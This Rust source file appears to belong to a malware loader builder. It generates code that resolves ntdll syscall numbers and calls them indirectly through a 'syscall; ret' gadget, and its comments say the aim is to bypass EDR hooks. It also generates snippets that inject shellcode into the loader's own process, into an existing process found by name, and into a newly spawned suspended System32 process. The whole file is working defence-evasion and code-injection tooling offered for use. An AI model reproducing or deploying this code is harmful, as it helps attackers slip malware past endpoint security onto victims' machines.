//! Generates indirect syscall resolver and caller code for the loader.
//! 
//! The generated code:
//! 1. Walks ntdll's EAT to find Nt* function stubs
//! 2. Reads the SSN (syscall number) from each stub
//! 3. Locates a `syscall; ret` gadget in ntdll's .text section
//! 4. Uses inline asm to invoke syscalls indirectly (bypasses EDR hooks)

/// Compute DJB2 hash at build time (matches the runtime djb2_hash in generated code)
fn djb2(name: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    for &b in name {
        if b == 0 { break; }
        hash = hash.wrapping_mul(33).wrapping_add(b as u32);
    }
    hash
}

/// Generates the syscall infrastructure code that gets embedded in the loader.
/// This includes the resolver, the SSN table, and the indirect syscall macro.
pub fn syscall_resolver_snippet() -> String {
    let body = r#"
// === Indirect Syscall Infrastructure ===
mod syscalls {
    use std::ffi::c_void;

    #[repr(C)]
    struct IMAGE_DOS_HEADER {
        e_magic: u16,
        _pad: [u8; 58],
        e_lfanew: i32,
    }

    #[repr(C)]
    struct IMAGE_EXPORT_DIRECTORY {
        characteristics: u32,
        time_date_stamp: u32,
        major_version: u16,
        minor_version: u16,
        name: u32,
        base: u32,
        number_of_functions: u32,
        number_of_names: u32,
        address_of_functions: u32,
        address_of_names: u32,
        address_of_name_ordinals: u32,
    }

    pub struct SyscallEntry {
        pub ssn: u16,
        pub hash: u32,
    }

    pub struct SyscallTable {
        pub entries: Vec<SyscallEntry>,
        pub gadget: *const u8,
    }

    /// DJB2 hash of a function name
    fn djb2_hash(name: &[u8]) -> u32 {
        let mut hash: u32 = 5381;
        for &b in name {
            if b == 0 { break; }
            hash = hash.wrapping_mul(33).wrapping_add(b as u32);
        }
        hash
    }

    /// Get ntdll base address from PEB
    unsafe fn get_ntdll_base() -> *const u8 {
        let peb: *const u8;
        core::arch::asm!(
            "mov {}, gs:[0x60]",
            out(reg) peb,
            options(nostack, nomem)
        );
        // PEB->Ldr
        let ldr = *(peb.add(0x18) as *const *const u8);
        // Ldr->InMemoryOrderModuleList.Flink
        let list_head = ldr.add(0x20) as *const *const u8;
        let mut entry = *list_head;
        // First entry is the exe itself, second is ntdll
        entry = *(entry as *const *const u8); // ntdll
        // InMemoryOrderLinks + 0x20 = DllBase (offset in LDR_DATA_TABLE_ENTRY)
        let dll_base = *((entry as *const u8).add(0x20) as *const *const u8);
        dll_base
    }

    /// Find a `syscall; ret` (0F 05 C3) gadget in ntdll's .text section
    unsafe fn find_syscall_gadget(ntdll_base: *const u8) -> *const u8 {
        let dos = ntdll_base as *const IMAGE_DOS_HEADER;
        let nt_headers = ntdll_base.add((*dos).e_lfanew as usize);
        let section_count = *(nt_headers.add(6) as *const u16);
        let opt_header_size = *(nt_headers.add(20) as *const u16) as usize;
        let sections_start = nt_headers.add(24 + opt_header_size);

        for i in 0..section_count as usize {
            let section = sections_start.add(i * 40);
            let name = std::slice::from_raw_parts(section, 8);
            if name.starts_with(b".text") {
                let va = *(section.add(12) as *const u32) as usize;
                let size = *(section.add(8) as *const u32) as usize;
                let text_start = ntdll_base.add(va);
                // Search for syscall; ret (0F 05 C3)
                for off in 0..(size - 3) {
                    let ptr = text_start.add(off);
                    if *ptr == 0x0F && *ptr.add(1) == 0x05 && *ptr.add(2) == 0xC3 {
                        return ptr;
                    }
                }
            }
        }
        std::ptr::null()
    }

    /// Extract SSN from an Nt* function stub.
    /// Pattern: 4C 8B D1 (mov r10, rcx) B8 XX XX 00 00 (mov eax, SSN)
    unsafe fn extract_ssn(func_addr: *const u8) -> Option<u16> {
        // Check for mov r10, rcx (4C 8B D1)
        if *func_addr == 0x4C && *func_addr.add(1) == 0x8B && *func_addr.add(2) == 0xD1 {
            // Next should be mov eax, imm32 (B8 XX XX 00 00)
            if *func_addr.add(3) == 0xB8 {
                let ssn = *(func_addr.add(4) as *const u16);
                return Some(ssn);
            }
        }
        // Hooked? Try to look for nearby pattern (EDR trampoline)
        // Search forward for the mov eax pattern within 32 bytes
        for off in 0..32usize {
            let ptr = func_addr.add(off);
            if *ptr == 0xB8 && *ptr.add(3) == 0x00 && *ptr.add(4) == 0x00 {
                // Verify it's preceded by 4C 8B D1 somewhere before
                let ssn = *(ptr.add(1) as *const u16);
                if ssn < 0x1000 { // reasonable SSN range
                    return Some(ssn);
                }
            }
        }
        None
    }

    /// Initialize the syscall table by resolving all needed functions
    pub unsafe fn init() -> SyscallTable {
        let ntdll_base = get_ntdll_base();
        let gadget = find_syscall_gadget(ntdll_base);

        let dos = ntdll_base as *const IMAGE_DOS_HEADER;
        let nt_headers = ntdll_base.add((*dos).e_lfanew as usize);
        // OptionalHeader offset: 24 bytes into NT headers, export dir is first data directory
        let opt_header = nt_headers.add(24);
        // DataDirectory[0] = Export directory (offset 112 into optional header on x64)
        let export_dir_rva = *(opt_header.add(112) as *const u32) as usize;
        if export_dir_rva == 0 {
            return SyscallTable { entries: Vec::new(), gadget: std::ptr::null() };
        }
        let export_dir = ntdll_base.add(export_dir_rva) as *const IMAGE_EXPORT_DIRECTORY;

        let names = ntdll_base.add((*export_dir).address_of_names as usize) as *const u32;
        let ordinals = ntdll_base.add((*export_dir).address_of_name_ordinals as usize) as *const u16;
        let functions = ntdll_base.add((*export_dir).address_of_functions as usize) as *const u32;

        let mut entries = Vec::new();
        let num_names = (*export_dir).number_of_names;

        for i in 0..num_names as usize {
            let name_rva = *names.add(i);
            let name_ptr = ntdll_base.add(name_rva as usize);
            // Only process Zw* functions (they map 1:1 to Nt* and have clean stubs)
            if *name_ptr == b'Z' && *name_ptr.add(1) == b'w' {
                let ordinal = *ordinals.add(i) as usize;
                let func_rva = *functions.add(ordinal);
                let func_addr = ntdll_base.add(func_rva as usize);

                if let Some(ssn) = extract_ssn(func_addr) {
                    // Compute hash of the Nt* equivalent name
                    // Convert Zw -> Nt for the hash
                    let mut name_bytes = Vec::new();
                    name_bytes.push(b'N');
                    name_bytes.push(b't');
                    let mut j = 2usize;
                    loop {
                        let b = *name_ptr.add(j);
                        if b == 0 { break; }
                        name_bytes.push(b);
                        j += 1;
                    }
                    name_bytes.push(0);
                    let hash = djb2_hash(&name_bytes);
                    entries.push(SyscallEntry { ssn, hash });
                }
            }
        }

        SyscallTable { entries, gadget }
    }

    /// Look up SSN by function name hash
    pub fn get_ssn(table: &SyscallTable, hash: u32) -> u16 {
        for entry in &table.entries {
            if entry.hash == hash {
                return entry.ssn;
            }
        }
        0
    }

    /// Indirect syscall with variable arguments via inline asm.
    /// Uses `call` to the gadget so `ret` returns back to us.
    #[inline(never)]
    pub unsafe fn syscall0(table: &SyscallTable, hash: u32) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x28",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            out("r10") _,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall1(table: &SyscallTable, hash: u32, a1: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x28",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            inlateout("r10") a1 => _,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall3(table: &SyscallTable, hash: u32, a1: u64, a2: u64, a3: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x28",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            inlateout("r10") a1 => _,
            in("rdx") a2,
            in("r8") a3,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall4(table: &SyscallTable, hash: u32, a1: u64, a2: u64, a3: u64, a4: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x28",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x28",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            inlateout("r10") a1 => _,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall6(table: &SyscallTable, hash: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x48",
            "mov [rsp+0x20], {a5}",
            "mov [rsp+0x28], {a6}",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x48",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            inlateout("r10") a1 => _,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall8(table: &SyscallTable, hash: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x58",
            "mov [rsp+0x20], {a5}",
            "mov [rsp+0x28], {a6}",
            "mov [rsp+0x30], {a7}",
            "mov [rsp+0x38], {a8}",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x58",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            a7 = in(reg) a7,
            a8 = in(reg) a8,
            inlateout("r10") a1 => _,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    #[inline(never)]
    pub unsafe fn syscall11(table: &SyscallTable, hash: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64, a7: u64, a8: u64, a9: u64, a10: u64, a11: u64) -> i64 {
        let ssn = get_ssn(table, hash) as u64;
        let gadget = table.gadget as u64;
        let ret: i64;
        core::arch::asm!(
            "sub rsp, 0x78",
            "mov [rsp+0x20], {a5}",
            "mov [rsp+0x28], {a6}",
            "mov [rsp+0x30], {a7}",
            "mov [rsp+0x38], {a8}",
            "mov [rsp+0x40], {a9}",
            "mov [rsp+0x48], {a10}",
            "mov [rsp+0x50], {a11}",
            "mov eax, {ssn:e}",
            "call {gadget}",
            "add rsp, 0x78",
            ssn = in(reg) ssn,
            gadget = in(reg) gadget,
            a5 = in(reg) a5,
            a6 = in(reg) a6,
            a7 = in(reg) a7,
            a8 = in(reg) a8,
            a9 = in(reg) a9,
            a10 = in(reg) a10,
            a11 = in(reg) a11,
            inlateout("r10") a1 => _,
            in("rdx") a2,
            in("r8") a3,
            in("r9") a4,
            out("rax") ret,
            clobber_abi("win64"),
        );
        ret
    }

    // Precomputed hashes for NT functions
"#;
    let constants = format!(
"    pub const NT_ALLOCATE_VIRTUAL_MEMORY: u32 = 0x{:08x};
    pub const NT_WRITE_VIRTUAL_MEMORY: u32 = 0x{:08x};
    pub const NT_PROTECT_VIRTUAL_MEMORY: u32 = 0x{:08x};
    pub const NT_CREATE_THREAD_EX: u32 = 0x{:08x};
    pub const NT_WAIT_FOR_SINGLE_OBJECT: u32 = 0x{:08x};
    pub const NT_OPEN_PROCESS: u32 = 0x{:08x};
    pub const NT_CLOSE: u32 = 0x{:08x};
    pub const NT_QUEUE_APC_THREAD: u32 = 0x{:08x};
    pub const NT_RESUME_THREAD: u32 = 0x{:08x};
    pub const NT_CREATE_PROCESS_EX: u32 = 0x{:08x};
}}
",
        djb2(b"NtAllocateVirtualMemory"),
        djb2(b"NtWriteVirtualMemory"),
        djb2(b"NtProtectVirtualMemory"),
        djb2(b"NtCreateThreadEx"),
        djb2(b"NtWaitForSingleObject"),
        djb2(b"NtOpenProcess"),
        djb2(b"NtClose"),
        djb2(b"NtQueueApcThread"),
        djb2(b"NtResumeThread"),
        djb2(b"NtCreateUserProcess"),
    );
    format!("{}{}", body, constants)
}

/// Generates the local self-injection snippet using indirect syscalls.
pub fn syscall_local_snippet() -> String {
    r#"    // Injection: Indirect Syscall — Local (self-inject)
    // Syscalls for memory allocation, CreateThread for execution
    {
        use std::ffi::c_void;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::Foundation::*;

        let table = unsafe { syscalls::init() };
        if table.gadget.is_null() { std::process::exit(0); }

        // NtAllocateVirtualMemory — allocate RW first
        let mut base_addr: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = shellcode.len();
        let status = unsafe {
            syscalls::syscall6(
                &table,
                syscalls::NT_ALLOCATE_VIRTUAL_MEMORY,
                u64::MAX, // NtCurrentProcess() = -1
                &mut base_addr as *mut _ as u64,
                0, // ZeroBits
                &mut region_size as *mut _ as u64,
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x04,   // PAGE_READWRITE
            )
        };
        let base_addr = unsafe { std::ptr::read_volatile(&base_addr) };
        if (status as i32) < 0 || base_addr.is_null() { std::process::exit(0); }

        // Copy shellcode
        unsafe {
            std::ptr::copy_nonoverlapping(
                shellcode.as_ptr(),
                base_addr as *mut u8,
                shellcode.len(),
            );
        }

        // NtProtectVirtualMemory — change to RX
        let mut protect_addr: *mut c_void = base_addr;
        let mut protect_size: usize = shellcode.len();
        let mut old_protect: u32 = 0;
        let status2 = unsafe {
            syscalls::syscall6(
                &table,
                syscalls::NT_PROTECT_VIRTUAL_MEMORY,
                u64::MAX,
                &mut protect_addr as *mut _ as u64,
                &mut protect_size as *mut _ as u64,
                0x20u64, // PAGE_EXECUTE_READ
                &mut old_protect as *mut _ as u64,
                0,
            )
        };
        if (status2 as i32) < 0 { std::process::exit(0); }

        // CreateThread for execution
        unsafe {
            let h = CreateThread(
                std::ptr::null(),
                0,
                Some(std::mem::transmute(base_addr)),
                std::ptr::null(),
                0,
                std::ptr::null_mut(),
            );
            if h.is_null() || h == INVALID_HANDLE_VALUE { std::process::exit(0); }
            WaitForSingleObject(h, u32::MAX);
            CloseHandle(h);
        }
    }"#.to_string()
}

/// Generates remote injection snippet using indirect syscalls (existing process).
pub fn syscall_remote_snippet(target: &str) -> String {
    format!(
        r#"    // Injection: Indirect Syscall — Remote CreateThread (existing process)
    {{
        use std::ffi::c_void;
        use windows_sys::Win32::System::Diagnostics::ToolHelp::*;
        use windows_sys::Win32::Foundation::*;

        let table = unsafe {{ syscalls::init() }};
        if table.gadget.is_null() {{ std::process::exit(0); }}

        let target_name = "{target}";

        let pid = unsafe {{
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap == INVALID_HANDLE_VALUE {{ std::process::exit(0); }}
            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
            let mut found_pid: u32 = 0;
            if Process32FirstW(snap, &mut entry) != 0 {{
                loop {{
                    let name = String::from_utf16_lossy(
                        &entry.szExeFile[..entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len())]
                    );
                    if name.to_lowercase() == target_name.to_lowercase() {{
                        found_pid = entry.th32ProcessID;
                        break;
                    }}
                    if Process32NextW(snap, &mut entry) == 0 {{ break; }}
                }}
            }}
            CloseHandle(snap);
            if found_pid == 0 {{ std::process::exit(0); }}
            found_pid
        }};

        // NtOpenProcess
        #[repr(C)]
        struct CLIENT_ID {{ unique_process: *mut c_void, unique_thread: *mut c_void }}
        #[repr(C)]
        struct OBJECT_ATTRIBUTES {{ length: u32, root: *mut c_void, name: *mut c_void, attrs: u32, sd: *mut c_void, qos: *mut c_void }}

        let mut proc_handle: *mut c_void = std::ptr::null_mut();
        let mut oa: OBJECT_ATTRIBUTES = unsafe {{ std::mem::zeroed() }};
        oa.length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
        let mut cid = CLIENT_ID {{ unique_process: pid as *mut c_void, unique_thread: std::ptr::null_mut() }};

        let status = unsafe {{
            syscalls::syscall4(
                &table,
                syscalls::NT_OPEN_PROCESS,
                &mut proc_handle as *mut _ as u64,
                0x001FFFFF, // PROCESS_ALL_ACCESS
                &mut oa as *mut _ as u64,
                &mut cid as *mut _ as u64,
            )
        }};
        if (status as i32) < 0 || proc_handle.is_null() {{ std::process::exit(0); }}

        // NtAllocateVirtualMemory in remote process
        let mut base_addr: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = shellcode.len();
        let status = unsafe {{
            syscalls::syscall6(
                &table,
                syscalls::NT_ALLOCATE_VIRTUAL_MEMORY,
                proc_handle as u64,
                &mut base_addr as *mut _ as u64,
                0,
                &mut region_size as *mut _ as u64,
                0x3000, // MEM_COMMIT | MEM_RESERVE
                0x40,   // PAGE_EXECUTE_READWRITE
            )
        }};
        if (status as i32) < 0 || base_addr.is_null() {{ std::process::exit(0); }}

        // NtWriteVirtualMemory
        let mut bytes_written: usize = 0;
        unsafe {{
            syscalls::syscall6(
                &table,
                syscalls::NT_WRITE_VIRTUAL_MEMORY,
                proc_handle as u64,
                base_addr as u64,
                shellcode.as_ptr() as u64,
                shellcode.len() as u64,
                &mut bytes_written as *mut _ as u64,
                0,
            );
        }}

        // NtCreateThreadEx in remote process
        let mut thread_handle: *mut c_void = std::ptr::null_mut();
        let status = unsafe {{
            syscalls::syscall11(
                &table,
                syscalls::NT_CREATE_THREAD_EX,
                &mut thread_handle as *mut _ as u64,
                0x1FFFFF, // THREAD_ALL_ACCESS
                0,
                proc_handle as u64,
                base_addr as u64,
                0,
                0, 0, 0, 0, 0,
            )
        }};
        if (status as i32) < 0 {{ std::process::exit(0); }}

        unsafe {{
            syscalls::syscall3(&table, syscalls::NT_WAIT_FOR_SINGLE_OBJECT, thread_handle as u64, 0, 0);
            syscalls::syscall1(&table, syscalls::NT_CLOSE, thread_handle as u64);
            syscalls::syscall1(&table, syscalls::NT_CLOSE, proc_handle as u64);
        }}
    }}"#,
        target = target
    )
}

/// Generates spawn + inject snippet using indirect syscalls.
pub fn syscall_spawn_snippet(target: &str) -> String {
    format!(
        r#"    // Injection: Indirect Syscall — Spawn + Inject
    {{
        use std::ffi::c_void;
        use windows_sys::Win32::System::Threading::*;
        use windows_sys::Win32::Foundation::*;

        let table = unsafe {{ syscalls::init() }};
        if table.gadget.is_null() {{ std::process::exit(0); }}

        let target_path: Vec<u16> = "C:\\Windows\\System32\\{target}"
            .encode_utf16().chain(std::iter::once(0)).collect();
        let mut si: STARTUPINFOW = unsafe {{ std::mem::zeroed() }};
        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
        let mut pi: PROCESS_INFORMATION = unsafe {{ std::mem::zeroed() }};

        let created = unsafe {{
            CreateProcessW(
                target_path.as_ptr(),
                std::ptr::null_mut(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                CREATE_SUSPENDED,
                std::ptr::null(),
                std::ptr::null(),
                &si,
                &mut pi,
            )
        }};
        if created == 0 {{ std::process::exit(0); }}

        // NtAllocateVirtualMemory
        let mut base_addr: *mut c_void = std::ptr::null_mut();
        let mut region_size: usize = shellcode.len();
        let status = unsafe {{
            syscalls::syscall6(
                &table,
                syscalls::NT_ALLOCATE_VIRTUAL_MEMORY,
                pi.hProcess as u64,
                &mut base_addr as *mut _ as u64,
                0,
                &mut region_size as *mut _ as u64,
                0x3000,
                0x40,   // PAGE_EXECUTE_READWRITE
            )
        }};
        if (status as i32) < 0 || base_addr.is_null() {{
            unsafe {{ TerminateProcess(pi.hProcess, 0); }}
            std::process::exit(0);
        }}

        // NtWriteVirtualMemory
        let mut bytes_written: usize = 0;
        unsafe {{
            syscalls::syscall6(
                &table,
                syscalls::NT_WRITE_VIRTUAL_MEMORY,
                pi.hProcess as u64,
                base_addr as u64,
                shellcode.as_ptr() as u64,
                shellcode.len() as u64,
                &mut bytes_written as *mut _ as u64,
                0,
            );
        }}

        // NtCreateThreadEx in suspended process
        let mut thread_handle: *mut c_void = std::ptr::null_mut();
        let status = unsafe {{
            syscalls::syscall11(
                &table,
                syscalls::NT_CREATE_THREAD_EX,
                &mut thread_handle as *mut _ as u64,
                0x1FFFFF,
                0,
                pi.hProcess as u64,
                base_addr as u64,
                0,
                0, 0, 0, 0, 0,
            )
        }};
        if (status as i32) < 0 {{
            unsafe {{ TerminateProcess(pi.hProcess, 0); }}
            std::process::exit(0);
        }}

        // Keep main thread suspended — shellcode runs in its own thread
        unsafe {{
            syscalls::syscall3(&table, syscalls::NT_WAIT_FOR_SINGLE_OBJECT, thread_handle as u64, 0, 0);
            syscalls::syscall1(&table, syscalls::NT_CLOSE, thread_handle as u64);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }}
    }}"#,
        target = target
    )
}
